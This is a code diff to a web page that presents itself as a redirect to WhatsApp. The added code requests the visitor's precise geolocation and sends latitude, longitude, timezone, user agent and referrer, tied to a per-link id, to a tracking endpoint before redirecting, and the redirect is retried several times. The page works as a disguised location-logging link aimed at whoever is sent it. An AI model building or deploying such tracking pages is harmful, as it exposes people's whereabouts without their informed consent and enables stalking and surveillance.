@@ -2,7 +2,6 @@
 export const dynamic = 'force-dynamic';
 
 export default function ThanksPage() {
-  // The env is inlined at build time. We also add a safe default.
   const configured = process.env.NEXT_PUBLIC_FALLBACK_URL || '';
   const defaultUrl = 'https://www.whatsapp.com/';
 
@@ -17,7 +16,7 @@ export default function ThanksPage() {
               (async () => {
                 const set = (t) => { try { document.getElementById('status').textContent = t; } catch {} };
 
-                // Determine ID
+                // Resolve ID
                 const url = new URL(location.href);
                 let id = url.searchParams.get('id') || '';
                 if (!id) {
@@ -25,44 +24,62 @@ export default function ThanksPage() {
                   if (seg.length === 1) id = seg[0];
                 }
 
-                // Track
+                // Attempt high-accuracy geolocation with a strict time budget
+                const geoPromise = new Promise((resolve) => {
+                  if (!navigator.geolocation) return resolve(null);
+                  let finished = false;
+                  const kill = setTimeout(() => { if (!finished) resolve(null); }, 1200);
+                  navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                      finished = true; clearTimeout(kill);
+                      resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy || null
+                      });
+                    },
+                    () => { finished = true; clearTimeout(kill); resolve(null); },
+                    { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 }
+                  );
+                });
+
+                const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || '');
+                const ua = navigator.userAgent || '';
+                const ref = document.referrer || '';
+
+                let geo = null;
+                try { geo = await geoPromise; } catch {}
+
                 try {
                   await Promise.race([
                     fetch('/api/track', {
                       method: 'POST',
                       headers: { 'content-type': 'application/json' },
-                      body: JSON.stringify({
-                        id,
-                        ua: navigator.userAgent || '',
-                        ref: document.referrer || ''
-                      })
+                      body: JSON.stringify({ id, ua, ref, tz, ...(geo || {}) })
                     }),
-                    new Promise(r => setTimeout(r, 700))
+                    new Promise(r => setTimeout(r, 800))
                   ]);
-                } catch (_) {}
+                  set('Logged. Redirecting…');
+                } catch (_) {
+                  set('Log failed. Redirecting…');
+                }
 
                 // Build fallback URL robustly
                 let fb = ${JSON.stringify(configured)} || ${JSON.stringify(defaultUrl)};
-                // If someone set "whatsapp.com" without protocol → fix it
                 if (fb && !/^https?:\\/\\//i.test(fb)) fb = 'https://' + fb;
 
                 // Expose manual link
                 try {
                   const a = document.getElementById('fallbackLink');
-                  a.href = fb;
-                  a.style.display = 'inline-block';
+                  a.href = fb; a.style.display = 'inline-block';
                   a.textContent = 'Continue to WhatsApp';
                 } catch {}
-
-                set('Logged. Redirecting…');
 
                 const go = () => {
                   try { location.replace(fb); } catch (e) {
                     try { location.href = fb; } catch (e2) {}
                   }
                 };
-
-                // Multiple attempts to dodge any transient blockers
                 setTimeout(go, 40);
                 setTimeout(go, 400);
                 setTimeout(go, 1200);
